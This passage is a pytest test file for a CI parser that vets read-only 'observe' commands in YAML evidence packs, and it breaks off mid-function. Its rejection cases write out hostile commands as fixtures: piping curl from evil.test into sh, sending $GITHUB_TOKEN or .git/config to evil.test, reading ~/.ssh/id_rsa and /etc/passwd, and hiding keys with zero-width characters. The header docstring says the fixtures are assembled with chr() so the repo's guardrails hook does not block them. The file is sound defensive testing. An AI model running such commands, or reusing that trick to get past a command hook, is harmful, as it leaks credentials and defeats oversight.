"""Tests for scripts/ci/bites_parse.py — the executable `Bites` contract parser.

Every guard gets a GUILT case (the disease IS caught) and an INNOCENCE case (the
adjacent legitimate command is NOT flagged), the discipline
cicatrix-superscar.md #3 requires and infra/guard-conformance/registry.json
enforces by name.

TWO PROPERTIES BEYOND THE PER-GUARD PAIRS, both of which exist because of a scar:

  * The `legacy` and `absent` outcomes must NEVER be errors. 110 of the 177 PRs
    merged since 2026-09-01 carry a prose `Bites` section and 67 carry none; a
    format that turned them red retroactively would be a ratchet nobody could
    land a PR through.
  * This file must be REACHABLE. immune-enforcement.yml's unit-test loop skips a
    listed file that is absent ("::notice::skip (absent)"), so adding a test
    there is not by itself proof it runs — deleting the file would go green.
    The presence assertion that actually bites is guard-conformance C3, which
    looks up each registered guilt/innocence def BY NAME in this file and fails
    when the file (or the def) is gone. `test_registry_registers_every_guard`
    below closes the loop from this side: a guard added to the module without a
    registry entry fails here, before CI has to notice.

FIXTURE-ASSEMBLY NOTE: the pipe and semicolon fixtures are built from chr()
rather than written as literals, for the reason documented at the corpus in
scripts/ci/bites_parse.py — the repo's own guardrails hook refuses any Bash
command whose text contains the attack shape, including a heredoc that is only
WRITING the fixture. The assembled runtime string is byte-identical to the
attack; only the source line differs.
"""
from __future__ import annotations

import importlib.util
import json
import subprocess
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parents[2]
_MODULE_PATH = _REPO_ROOT / "scripts" / "ci" / "bites_parse.py"
_spec = importlib.util.spec_from_file_location("bites_parse", _MODULE_PATH)
assert _spec is not None and _spec.loader is not None
bp = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(bp)

_PIPE = chr(124)
_SEMI = chr(59)


def _pack(observe: str, *, where: str = "ci", expect: str = "exit0",
          consumer: str = "CI") -> str:
    """A minimal pack.yml carrying one `bites:` block, command single-quoted."""
    quoted = observe.replace("'", "''")
    return (
        f"gear: 3\nbites:\n  consumer: {consumer}\n  where: {where}\n"
        f"  observe: '{quoted}'\n  expect: {expect}\n"
    )


def _classify(pack: str) -> str:
    return bp.classify(bp.parse_pack(pack))


# ------------------------------------------------- _guard_shell_composition


def test_shell_composition_guilt_pipe_to_shell_is_rejected():
    """The canonical break: one command becomes two, the second one a shell."""
    command = "curl https://evil.test/x " + _PIPE + " sh"
    assert bp._guard_shell_composition(command), "a pipe must be caught"
    assert _classify(_pack(command)) == "malformed"


def test_shell_composition_guilt_command_substitution_is_rejected():
    assert bp._guard_shell_composition("git log $(whoami)")


def test_shell_composition_guilt_bare_variable_is_rejected():
    """`$SECRET` executes nothing, and exfiltrates just as well inside a URL."""
    assert bp._guard_shell_composition("curl https://evil.test/$GITHUB_TOKEN")


def test_shell_composition_innocence_plain_command_passes():
    assert bp._guard_shell_composition("python3 scripts/pending_arms_report.py") == []


def test_shell_composition_innocence_sha_placeholder_is_not_expansion():
    """The one sanctioned substitution must not read as shell expansion."""
    assert bp._guard_shell_composition(
        "python3 scripts/ci/bites_ledger_check.py --sha {sha}"
    ) == []


# ------------------------------------------------- _guard_command_allowlist


def test_command_allowlist_guilt_arbitrary_interpreter_is_rejected():
    assert bp._guard_command_allowlist("bash scripts/deploy.sh")


def test_command_allowlist_guilt_fly_write_subcommand_is_rejected():
    """An observation that changes production is not an observation."""
    assert bp._guard_command_allowlist("flyctl deploy -a nuzantara-rag")


def test_command_allowlist_guilt_python_dash_m_anything_is_rejected():
    assert bp._guard_command_allowlist("python3 -m http.server")


def test_command_allowlist_guilt_python_outside_scripts_is_rejected():
    assert bp._guard_command_allowlist("python3 evil.py")


def test_command_allowlist_guilt_curl_writing_a_file_is_rejected():
    assert bp._guard_command_allowlist("curl -o hook https://evil.test/h")


def test_command_allowlist_guilt_curl_plain_http_is_rejected():
    assert bp._guard_command_allowlist("curl http://evil.test/x")


def test_command_allowlist_guilt_git_dash_c_runs_a_program():
    """`git -c core.sshCommand=...` is code execution with no metacharacter in sight."""
    assert bp._guard_command_allowlist("git -c core.sshCommand=evil log")


def test_command_allowlist_guilt_git_network_subcommand_is_rejected():
    assert bp._guard_command_allowlist("git fetch https://evil.test/r")


def test_command_allowlist_guilt_gh_write_subcommand_is_rejected():
    assert bp._guard_command_allowlist("gh pr merge 5658 --squash")


def test_command_allowlist_guilt_gh_api_non_get_is_rejected():
    assert bp._guard_command_allowlist("gh api -X POST repos/o/r/issues")


def test_command_allowlist_guilt_curl_sending_a_body_is_rejected():
    assert bp._guard_command_allowlist("curl -d secret https://evil.test/x")


def test_command_allowlist_guilt_pytest_plugin_flag_is_rejected():
    assert bp._guard_command_allowlist("python3 -m pytest -p evil scripts/tests/x.py")


# --- the second adversarial round: a one-word check on a two-word subcommand


def test_command_allowlist_guilt_fly_machine_run_is_rejected():
    """`machine` was allow-listed as a first WORD; `fly machine run` runs a container."""
    assert bp._guard_command_allowlist("fly machine run evil/image -a nuzantara-rag")


def test_command_allowlist_guilt_fly_machine_destroy_is_rejected():
    assert bp._guard_command_allowlist("flyctl machine destroy 1234 -a nuzantara-rag")


def test_command_allowlist_innocence_fly_read_pairs_pass():
    for command in (
        "flyctl status -a nuzantara-rag",
        "flyctl releases -a nuzantara-rag",
        "flyctl image show -a nuzantara-rag",
        "flyctl machine list -a nuzantara-rag",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_command_allowlist_guilt_git_tag_creates_a_ref():
    """With an argument `git tag` WRITES. Read-only must hold in every invocation."""
    assert bp._guard_command_allowlist("git tag v9.9.9")


def test_command_allowlist_guilt_git_output_writes_a_file():
    assert bp._guard_command_allowlist("git diff --output=out.txt HEAD")


def test_command_allowlist_guilt_curl_reading_a_local_file_is_rejected():
    """actions/checkout leaves credentials in .git/config, a relative path in the tree."""
    assert bp._guard_command_allowlist("curl -b .git/config https://evil.test/x")


def test_command_allowlist_guilt_curl_schemeless_host_is_rejected():
    """`curl evil.test/x` contains no `://`, and curl defaults it to plain http."""
    assert bp._guard_command_allowlist("curl evil.test/x")


def test_command_allowlist_guilt_gh_pointing_at_another_repo_is_rejected():
    assert bp._guard_command_allowlist("gh pr view 1 --repo=attacker/repo")


def test_command_allowlist_innocence_every_real_shape_passes():
    """The shapes real observations actually take must all survive."""
    for command in (
        "python3 scripts/pending_arms_report.py",
        "python3 -m pytest scripts/tests/test_bites_parse.py",
        "gh pr view 5658 --json state",
        "git log -1 --format=%H",
        "flyctl status -a nuzantara-rag",
        "curl -sS https://nuzantara-rag.fly.dev/health",
    ):
        assert bp._guard_command_allowlist(command) == [], command


# ------------------------------------------------- _guard_no_remote_shell


def test_no_remote_shell_guilt_reach_hidden_in_an_argument_is_rejected():
    """The under-match twin, and the assertion is what proves the two guards differ.

    `git log` is a permitted subcommand and the allow-list passes this command in full
    — it inspects the program and the subcommand, not every argument. The reach lives
    in the ARGUMENT, which is exactly the shape a head-of-command guard cannot see.
    """
    command = "git log ssh://evil.test/repo"
    assert bp._guard_command_allowlist(command) == [], "premise: the allow-list passes it"
    assert bp._guard_no_remote_shell(command)


def test_no_remote_shell_guilt_bare_token_is_rejected():
    assert bp._guard_no_remote_shell("git status rsync")


def test_no_remote_shell_innocence_https_url_passes():
    assert bp._guard_no_remote_shell("curl -sS https://nuzantara-rag.fly.dev/health") == []


# ------------------------------------------------- _guard_path_containment


def test_path_containment_guilt_parent_escape_is_rejected():
    assert bp._guard_path_containment("python3 scripts/../../evil.py")


def test_path_containment_guilt_absolute_path_is_rejected():
    assert bp._guard_path_containment("python3 scripts/x.py /Users/n/.secrets.env")


def test_path_containment_innocence_repo_relative_paths_pass():
    assert bp._guard_path_containment(
        "python3 -m pytest scripts/tests/test_bites_parse.py"
    ) == []


def test_path_containment_innocence_url_path_is_not_a_filesystem_path():
    """A URL contains slashes and is not an escape — the classic over-match."""
    assert bp._guard_path_containment("curl -sS https://host.test/a/b/c") == []


# ------------------------------------------------- _guard_observable_script
#
# The guard Codex's red-team pass forced into existence. `python3 scripts/...` reads
# like a narrow rule and admits roughly nine hundred scripts, several of which execute
# a program their argument names.


def test_observable_script_guilt_undeclared_script_is_rejected(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "plain.py").write_text("print(1)\n", encoding="utf-8")
    assert bp._guard_observable_script("python3 scripts/plain.py", repo_root=tmp_path)


def test_observable_script_guilt_a_real_execvpe_script_is_rejected():
    """`scripts/usage/cswap.py run <cmd>` reaches os.execvpe. It must stay unreachable."""
    assert (_REPO_ROOT / "scripts" / "usage" / "cswap.py").is_file(), "fixture moved"
    assert bp._guard_observable_script("python3 scripts/usage/cswap.py run sh")


def test_observable_script_guilt_missing_file_is_rejected():
    assert bp._guard_observable_script("python3 scripts/definitely_not_here.py")


def test_observable_script_guilt_pytest_target_outside_tests_is_rejected():
    assert bp._guard_observable_script("python3 -m pytest scripts/ci/bites_parse.py")


def test_observable_script_innocence_declared_script_passes(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "ok.py").write_text(
        f"# {bp.OBSERVABLE_MARKER}\nprint(1)\n", encoding="utf-8"
    )
    assert bp._guard_observable_script("python3 scripts/ok.py", repo_root=tmp_path) == []


def test_observable_script_innocence_this_module_declares_itself():
    """PR-1's own Bites runs this file; the rule must admit it, by the marker."""
    assert bp._guard_observable_script("python3 scripts/ci/bites_parse.py --selftest") == []


def test_observable_script_innocence_pytest_under_tests_passes():
    assert bp._guard_observable_script(
        "python3 -m pytest scripts/tests/test_bites_parse.py"
    ) == []


# ------------------------------------------------- the pack layer itself
#
# Gemini's finding, in the form it takes now that the contract is a FILE. When the
# block lived in a PR body, a hostile author could render one contract to a reviewer
# and hand a different one to the parser (an HTML comment, a fence, a four-space
# indent, a raw <pre>). A pack.yml has no rendered form, so that whole class is gone.
# What YAML brings in its place is smaller and enumerable: two keys with one name,
# an alias that puts the value somewhere else, and a scalar YAML types for you.


def test_two_bites_blocks_in_one_pack_are_refused_not_last_wins():
    """`yaml.safe_load` keeps the LAST duplicate silently — a reader keeps the first."""
    pack = (
        "bites:\n  consumer: honest\n  where: ci\n  observe: git status\n  expect: exit0\n"
        "bites:\n  consumer: attacker\n  where: ci\n  observe: git log\n  expect: exit0\n"
    )
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True, result
    assert any("duplicate key" in e for e in result["errors"]), result


def test_two_observe_keys_in_one_block_are_refused():
    pack = (
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n"
        "  observe: git log\n  expect: exit0\n"
    )
    assert bp.parse_pack(pack).get("malformed") is True


def test_an_alias_cannot_put_the_command_somewhere_else():
    """A contract has to be readable where it is written."""
    pack = (
        "anchors:\n  cmd: &cmd git log\n"
        "bites:\n  consumer: x\n  where: ci\n  observe: *cmd\n  expect: exit0\n"
    )
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True
    assert any("alias" in e for e in result["errors"]), result


def test_a_merge_key_cannot_import_a_block():
    pack = (
        "base: &base\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n"
        "bites:\n  <<: *base\n"
    )
    assert bp.parse_pack(pack).get("malformed") is True


def test_innocence_an_ordinary_pack_with_other_keys_still_parses():
    """The pack schema is open — `bites:` must not care what else the file carries."""
    pack = (
        "gear: 3\nbrief_ref: evidence/brief.yml\nspend:\n  tokens: 1\n"
        "bites:\n  consumer: CI\n  where: ci\n  observe: git status\n  expect: exit0\n"
    )
    assert bp.parse_pack(pack).get("observe") == "git status"


def test_a_yaml_typed_scalar_is_refused_rather_than_coerced():
    """`expect: no` is False and `observe: 42` is an int. A contract is text."""
    boolean = bp.parse_pack(
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: no\n"
    )
    assert boolean.get("malformed") is True
    assert any("not a string" in e for e in boolean["errors"]), boolean
    number = bp.parse_pack(
        "bites:\n  consumer: x\n  where: ci\n  observe: 42\n  expect: exit0\n"
    )
    assert number.get("malformed") is True


def test_a_pack_that_is_not_yaml_is_malformed_not_absent():
    """Unparseable must never read as `no contract here` — that is fail-open."""
    result = bp.parse_pack("gear: 3\n\tbites:\n  consumer: x\n")
    assert result.get("malformed") is True
    assert any("does not parse" in e for e in result["errors"]), result


def test_a_zero_width_character_in_a_value_is_refused_not_guessed():
    pack = (
        "bites:\n  consumer: x\n  where: ci\n"
        f'  observe: "git{chr(0x200b)} status"\n  expect: exit0\n'
    )
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True
    assert any("invisible" in e for e in result["errors"]), result


def test_an_invisible_character_anywhere_in_the_pack_is_refused():
    """This test used to assert the OPPOSITE, and asserting it was the hole.

    The first rule judged the four contract VALUES and an innocence test pinned that a
    zero-width character elsewhere in the pack was fine. Then a reviewer pointed the
    trick at a KEY: `bites<ZWSP>:` renders as `bites:` and parses as a different key, so
    the reviewer reads a contract and the parser reports `absent` — silently, and
    fail-open. `observe<ZWSP>:` beside a real `observe:` is the same trick one level in,
    and YAML does not even see a duplicate. Nothing legitimate in a pack needs one of
    these characters, so the rule is now the whole FILE.
    """
    z = chr(0x200b)
    for pack in (
        f"bites{z}:\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n",
        f"bites:\n  consumer: x\n  where: ci\n  observe: git status\n"
        f"  observe{z}: git log\n  expect: exit0\n",
        f"notes: a receipt with a zero{z}width character in it\n"
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n",
    ):
        result = bp.parse_pack(pack)
        assert result.get("malformed") is True, result
        assert any("invisible" in e for e in result["errors"]), result


def test_innocence_ordinary_unicode_in_a_pack_is_not_penalised():
    """Narrowness: the rule is invisible characters, not non-ASCII ones."""
    pack = (
        "notes: an em-dash — and an accent é are ordinary prose\n"
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
    )
    assert bp.parse_pack(pack).get("observe") == "git status"


# --- the hole Zero's order named: every allow-list entry is a full pair


def test_command_allowlist_guilt_fly_version_upgrade_replaces_the_binary():
    """`fly version` reads; `fly version upgrade` downloads and installs a new flyctl.

    The entry was `("version", None)`, where `None` meant "any second word", and the
    same one-word shape had already admitted `fly machine run` two rounds earlier.
    NO_SUBCOMMAND names what was actually meant, so the third instance of superscar
    #3's under-match in this one file closes as a class rather than as a case.
    """
    assert bp._guard_command_allowlist("fly version upgrade")
    assert bp._guard_command_allowlist("flyctl version upgrade")


def test_command_allowlist_innocence_fly_version_and_flagged_reads_pass():
    for command in (
        "fly version",
        "flyctl version",
        "flyctl status -a nuzantara-rag",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_leading_words_stops_at_the_first_flag():
    """A flag's separate VALUE is not a subcommand word.

    Filtering out tokens that start with `-` and then reading words[0:2] made
    `fly status -a nuzantara-rag` parse as the pair ("status", "nuzantara-rag"),
    which is why NO_SUBCOMMAND could not be enforced until this was fixed.
    """
    assert bp._leading_words(["status", "-a", "nuzantara-rag"]) == ["status"]
    assert bp._leading_words(["machine", "list", "-a", "app"]) == ["machine", "list"]
    assert bp._leading_words(["-a", "app", "status"]) == []


def test_subcommand_sentinels_mean_two_different_things():
    """ANY_POSITIONAL admits a data word; NO_SUBCOMMAND admits none."""
    table = (("api", bp.ANY_POSITIONAL), ("version", bp.NO_SUBCOMMAND))
    assert bp._subcommand_permitted(["api", "repos/o/r"], table)
    assert bp._subcommand_permitted(["version"], table)
    assert not bp._subcommand_permitted(["version", "upgrade"], table)


def test_gh_api_still_takes_its_endpoint_positional():
    assert bp._guard_command_allowlist("gh api repos/o/r/pulls/1") == []


def test_path_containment_guilt_a_flag_can_carry_a_path():
    """`curl -w@<path>` prints a local file to stdout; the value rides in glued.

    The guard skipped every token starting with `-`, so containment was decided by the
    token's first CHARACTER rather than by what it names — which is how an absolute path
    walked past a guard whose whole subject is paths.
    """
    assert bp._guard_path_containment("curl -sS -w@/etc/passwd https://evil.test/x")
    assert bp._guard_path_containment("git log --format=/etc/passwd")
    assert bp._guard_path_containment("python3 scripts/x.py --out=../../etc/passwd")


def test_path_containment_innocence_ordinary_flag_values_pass():
    assert bp._guard_path_containment("git log -1 --format=%H") == []
    assert bp._guard_path_containment("flyctl status -a nuzantara-rag") == []


def test_command_allowlist_guilt_curl_write_out_is_rejected():
    assert bp._guard_command_allowlist("curl -sS -w@.git/config https://evil.test/x")


def test_command_allowlist_guilt_git_grep_pager_command_is_rejected():
    """`-O<cmd>` glues its value on, which a split-on-`=` comparison never matches."""
    assert bp._guard_command_allowlist("git grep -Oevil pattern")


def test_command_allowlist_guilt_git_global_flags_that_retarget_are_rejected():
    assert bp._guard_command_allowlist("git -C /other log")


def test_command_allowlist_innocence_git_grep_count_flag_passes():
    """The over-match twin: `git grep -c` counts, and only git's GLOBAL -c is dangerous.

    This is the assertion that keeps the positional split honest. Collapsing the two
    lists back into one flat scan turns a correct guard into superscar #3's over-match,
    and this test is what says so.
    """
    assert bp._guard_command_allowlist("git grep -c some-marker") == []


def test_command_allowlist_guilt_pytest_override_ini_is_rejected():
    """`--override-ini=addopts=-pevil` reinstates every flag the plugin ban removes."""
    assert bp._guard_command_allowlist(
        "python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py"
    )
    assert bp._guard_command_allowlist("python3 -m pytest -oaddopts=-pevil scripts/tests/x.py")


def test_command_allowlist_guilt_curl_credential_files_are_rejected():
    assert bp._guard_command_allowlist("curl --netrc-file=creds https://evil.test/x")


def test_command_allowlist_guilt_curl_variable_expands_the_environment():
    """curl does the expansion internally, so refusing `$` in the string is not enough."""
    assert bp._guard_command_allowlist("curl --variable=%GITHUB_TOKEN https://evil.test/x")


def test_flag_matcher_handles_all_three_spellings():
    assert bp._flag_is("-O", "-O") and bp._flag_is("-Oevil", "-O")
    assert bp._flag_is("--output=x", "--output") and not bp._flag_is("--outputs", "--output")
    assert bp._flag_is("--expand-url", "--expand-")


# --- round 1 on the file form: two deny-lists inverted, one path shape added


def test_command_allowlist_guilt_curl_options_that_touch_the_disk_are_rejected():
    """Three holes in one review pass, which is what inverted the list.

    `--json` is documented as a shortcut for `--data` and takes the same `@filename`
    file-read syntax; `--libcurl` writes a generated C file; `--etag-save` writes a file
    whose content the remote controls. None was in the deny-list, which had already lost
    `-b`, `-w@`, `--netrc-file` and `--variable` one at a time.
    """
    for command in (
        "curl --json=@.git/config https://evil.test/x",
        "curl --libcurl=out.c https://example.test/",
        "curl --etag-save=out.txt https://example.test/",
        "curl --etag-compare=creds https://example.test/",
        "curl --output-dir=evidence https://example.test/",
    ):
        assert bp._guard_command_allowlist(command), command


def test_command_allowlist_innocence_the_curl_shapes_an_observation_needs_pass():
    """Narrowness: inverting a list is only safe if the real shapes survive it."""
    for command in (
        "curl -sS https://nuzantara-rag.fly.dev/health",
        "curl -sSL https://nuzantara-rag.fly.dev/health",
        "curl -f --max-time=10 https://nuzantara-rag.fly.dev/health",
        "curl --header=accept:application/json https://nuzantara-rag.fly.dev/health",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_command_allowlist_guilt_git_no_index_leaves_the_repository():
    """`git diff --no-index a b` diffs two arbitrary files and never reads the repo."""
    assert bp._guard_command_allowlist("git diff --no-index a ~/.netrc")


def test_command_allowlist_innocence_the_git_shapes_an_observation_needs_pass():
    for command in (
        "git log -1 --format=%H",
        "git log --oneline -5",
        "git grep -c some-marker",
        "git diff --stat HEAD",
        "git rev-parse --abbrev-ref HEAD",
        "git show --name-only HEAD",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_path_containment_guilt_a_home_relative_path_is_an_escape():
    """`~` is absolute the moment a shell touches it, and the executor uses one.

    Every metacharacter _guard_shell_composition refuses is inert without a shell, so
    the safe reading of this module's own design is that the executor invokes through
    one. Under that reading `~/.netrc` is `/Users/<name>/.netrc`.
    """
    assert bp._guard_path_containment("python3 scripts/x.py ~/.ssh/id_rsa")
    assert bp._guard_path_containment("git diff --no-index a ~/.netrc")
    assert bp._guard_path_containment("python3 scripts/x.py --out=~/.netrc")


def test_path_containment_innocence_a_tilde_inside_a_word_is_not_an_escape():
    """The over-match twin: `~` only escapes in first position."""
    assert bp._guard_path_containment("python3 scripts/x.py evidence/a~b/pack.yml") == []
    assert bp._guard_path_containment("git log --grep=approx~") == []


def test_is_count_flag_accepts_only_a_bare_short_number():
    assert bp._is_count_flag("-1") and bp._is_count_flag("-20")
    assert not bp._is_count_flag("-O") and not bp._is_count_flag("--1x") and not bp._is_count_flag("-")


# ------------------------------------------------- _guard_expect_form


def test_expect_form_guilt_unknown_form_is_rejected():
    assert bp._guard_expect_form("green")


def test_expect_form_guilt_uncompilable_regex_is_rejected():
    assert bp._guard_expect_form("regex:[unclosed")


def test_expect_form_guilt_empty_needle_is_rejected():
    assert bp._guard_expect_form("contains:")


def test_expect_form_innocence_three_documented_forms_pass():
    for expect in ("exit0", "contains:PASS", r"regex:proven_by_machine=[1-9]"):
        assert bp._guard_expect_form(expect) == [], expect


# --- round 2 (cross-family): pytest inverted, ReDoS bounded, taxonomy closed


def test_command_allowlist_guilt_pytest_options_that_write_are_rejected():
    """The deny-list banned what IMPORTS and never considered what WRITES.

    `--junitxml=<relative path>` writes an XML report anywhere in the checkout, over a
    source file if you point it there, and _guard_path_containment permits a relative
    path by design. That is the third list in this file inverted for the same reason.
    """
    for command in (
        "python3 -m pytest --junitxml=out.xml scripts/tests/test_bites_parse.py",
        "python3 -m pytest --junitxml=scripts/ci/bites_parse.py scripts/tests/x.py",
        "python3 -m pytest --basetemp=tmp scripts/tests/test_bites_parse.py",
        "python3 -m pytest -pevil scripts/tests/test_bites_parse.py",
    ):
        assert bp._guard_command_allowlist(command), command


def test_command_allowlist_innocence_the_pytest_shapes_an_observation_needs_pass():
    for command in (
        "python3 -m pytest scripts/tests/test_bites_parse.py",
        "python3 -m pytest -q scripts/tests/test_bites_parse.py",
        "python3 -m pytest -x --tb=short scripts/tests/test_bites_parse.py",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_expect_form_guilt_a_regex_that_burns_runner_cpu_is_rejected():
    """`^(a+)+$` at 24 characters measured 0.376s and quadruples every two.

    Anyone who can open a pull request can schedule that, so the rule is structural:
    a repeat may not contain a repeat or an alternation. `(a|a)+` measured 0.703s at
    the same length, which is why the alternation half is in the rule and not only the
    quantifier half.
    """
    assert bp._guard_expect_form("regex:^(a+)+$")
    assert bp._guard_expect_form("regex:(a*)*b")
    assert bp._guard_expect_form("regex:^(a|a)+$")
    assert bp._guard_expect_form("regex:" + "x" * (bp.MAX_REGEX_LEN + 1))


def test_expect_form_innocence_ordinary_comparisons_still_pass():
    """Narrowness: one quantifier is not nesting, and an unquantified group is fine."""
    for expect in (
        "regex:[0-9]+ passed",
        "regex:^deployed$",
        "regex:proven_by_machine=[1-9]",
        "regex:(deployed|running)",
        "contains:MERGED",
        "exit0",
    ):
        assert bp._guard_expect_form(expect) == [], expect


def test_a_pack_that_crashes_the_yaml_parser_is_malformed_not_a_traceback():
    """500 nested sequences raise RecursionError, which is not a yaml.YAMLError.

    Before this, that input left the outcome taxonomy entirely: traceback, exit 1, no
    JSON — a fourth case every caller would have had to know about, fail-closed only by
    accident of how GitHub Actions reads an exit code.
    """
    pack = (
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
        "pad: " + "[" * 500 + "]" * 500 + "\n"
    )
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True, result
    assert any("does not parse" in e for e in result["errors"]), result


def test_cli_on_a_crashing_pack_exits_two_not_one():
    """The CLI contract is 0 or 2. Anything else is a case the executor must guess at."""
    pack = (
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
        "pad: " + "[" * 500 + "]" * 500 + "\n"
    )
    done = subprocess.run(
        ["python3", str(_MODULE_PATH), "--pack", "-"],
        input=pack, capture_output=True, text=True, check=False,
    )
    assert done.returncode == bp.EXIT_MALFORMED, (done.returncode, done.stderr[-300:])
    assert json.loads(done.stdout)["malformed"] is True


# --- round 3 (cross-family): the last two deny-lists inverted, and the KEY-level trick


def test_command_allowlist_guilt_gh_and_fly_options_that_write_or_read_are_rejected():
    """The two option lists that were still deny-lists, and what they were missing.

    `gh --cache=1h` persists a response cache; `gh --web` opens a browser; `fly
    --config=<path>` READS the file its argument names — through a subcommand table that
    was otherwise correct, which is the point: checking the verbs and not the flags is
    half a guard.
    """
    for command in (
        "gh api repos/o/r --cache=1h",
        "gh pr view 1 --web",
        "gh pr view 1 -R other/repo",
        "fly status --config=.git/config",
        "flyctl status -c .git/config",
    ):
        assert bp._guard_command_allowlist(command), command


def test_command_allowlist_guilt_git_global_options_are_all_refused():
    """`-c` runs a program, `--paginate` starts $PAGER, `--help` starts man or a browser."""
    for command in (
        "git -c core.sshCommand=evil log",
        "git --paginate log -1",
        "git --help log",
        "git -C /other log",
    ):
        assert bp._guard_command_allowlist(command), command


def test_command_allowlist_guilt_a_gpg_pretty_format_runs_a_program():
    """`%GG` asks git to verify a signature, which runs `gpg.program`."""
    assert bp._guard_command_allowlist("git log -1 --format=%GG")
    assert bp._guard_command_allowlist("git log -1 --pretty=%G?")


def test_command_allowlist_guilt_pytest_target_and_arity_holes():
    """Three shapes that all end in pytest discovering the tree, or importing a module."""
    for command in (
        "python3 -m pytest",
        "python3 -m pytest -k tests",
        "python3 -m pytest -W=error::evil.Custom scripts/tests/test_bites_parse.py",
        "python3 -m pytest scripts/tests/does_not_exist.py",
    ):
        assert bp._guard_command_allowlist(command) or bp._guard_observable_script(command), command


def test_args_from_file_guilt_at_prefixed_arguments_are_rejected():
    """pytest expands `@file` into arguments; curl reads `@file` into the request."""
    for command in (
        "python3 -m pytest @scripts/tests/args.txt",
        "curl -sS --json=@.git/config https://x.test/h",
        "curl -sS -w@.git/config https://x.test/h",
    ):
        assert bp._guard_args_from_file(command), command


def test_args_from_file_innocence_an_email_shaped_value_is_not_a_file_read():
    """The over-match twin: `@` only reads a file when it OPENS the value."""
    assert bp._guard_args_from_file("git log --author=a@b.test") == []
    assert bp._guard_args_from_file("git log --grep=user@host") == []


def test_command_allowlist_innocence_the_gh_fly_and_git_shapes_still_pass():
    for command in (
        "gh pr view 5658 --json state",
        "gh api repos/o/r/pulls/1 --json state",
        "flyctl status -a nuzantara-rag",
        "flyctl machine list -a nuzantara-rag --json",
        "git log -1 --format=%H",
        "git diff --stat HEAD",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_a_misspelled_key_is_a_broken_contract_not_prose():
    """`obsevre:` beside `where:` and `expect:` used to read as legacy, silently."""
    pack = "bites:\n  consumer: x\n  where: ci\n  obsevre: git log\n  expect: exit0\n"
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True, result
    assert any("unknown key" in e for e in result["errors"]), result


def test_a_block_using_none_of_the_executable_keys_is_still_legacy():
    """Narrowness: prose is prose, and the 148 packs on main must stay green."""
    assert bp.parse_pack("bites:\n  consumer: CI\n  observation: green\n")["legacy"] is True
    assert bp.parse_pack("bites: a sentence about the consumer\n")["legacy"] is True


def test_the_cli_refuses_to_read_a_file_that_is_not_an_evidence_pack():
    """The marker authorises the SCRIPT, never its argv.

    `python3 scripts/ci/bites_parse.py --pack .git/config` pointed the parser at the file
    actions/checkout persists a token into, and the parse error would have quoted the line.
    """
    done = subprocess.run(
        ["python3", str(_MODULE_PATH), "--pack", ".git/config"],
        capture_output=True, text=True, check=False, cwd=str(_REPO_ROOT),
    )
    assert done.returncode == bp.EXIT_MALFORMED
    assert "evidence" in done.stderr
    assert "url" not in done.stdout.lower()


def test_a_yaml_error_does_not_echo_the_offending_line():
    """The failure text is a file-reading primitive if it quotes what it read."""
    message = bp.parse_pack("bites:\n\tconsumer: s3cr3t-looking-value\n")["errors"][0]
    assert "s3cr3t-looking-value" not in message, message


# --- round 4: the two escapes still open, and the over-match the inversions introduced


def test_path_containment_guilt_the_two_escapes_a_slash_split_misses():
    """`~user` is a tilde too, and a `..` component can follow a delimiter other than `/`.

    `git log -L 1,1:../secret` splits on `/` to ['1,1:..', 'secret'] and neither piece
    equals `..`; git's own line-range syntax puts a colon there. The rule the first
    version stated ("the checkout or nothing") was simply false for both.
    """
    assert bp._guard_path_containment("git log -L 1,1:../secret -1")
    assert bp._guard_path_containment("git log ~otheruser/.ssh/id_rsa")
    assert bp._guard_path_containment("python3 scripts/x.py --out=1,1:../secret")


def test_command_allowlist_innocence_the_repo_own_idioms_survived_the_inversion():
    """The half a reviewer has to be ASKED for: what did inverting three lists break?

    Each of these is read-only and each is already in daily use in this repository —
    `--diff-filter=` in eight files, `--no-renames` in eleven, `curl -m 5` in five,
    `-w '%{http_code}'` as the standard health check. Three of them were refused by the
    first draft of the inversion, which is the over-match twin of the holes the
    inversion closed.
    """
    for command in (
        "git diff --cached --name-only --diff-filter=ACMR",
        "git diff --name-only -- apps/backend-rag",
        "git diff --no-renames HEAD",
        "git diff -U0 HEAD",
        "git diff -z --name-only HEAD",
        "curl -fsS -m 5 https://nuzantara-rag.fly.dev/health",
        "curl -sS -w %{http_code} https://nuzantara-rag.fly.dev/health",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_curl_still_takes_exactly_one_url_after_the_arity_fix():
    """Consuming a value must not let a SECOND url through."""
    assert bp._guard_command_allowlist("curl -sS -m 5 https://a.test/h https://b.test/h")
    assert bp._guard_command_allowlist("curl -sS -w %{http_code} https://a.test/h b.test")


def test_args_from_file_innocence_a_url_query_string_is_not_a_flag_value():
    """`?cb=@2` in a URL contains `=@` and reads no file."""
    assert bp._guard_args_from_file("curl -sS https://x.test/health?cb=@2") == []
    assert bp._guard_args_from_file("curl -sS -w@.git/config https://x.test/h")


# ------------------------------------------------- _guard_where_scope


def test_where_scope_guilt_unknown_scope_is_rejected():
    assert bp._guard_where_scope("laptop")


def test_where_scope_innocence_four_declared_scopes_pass():
    for where in bp.WHERE_SCOPES:
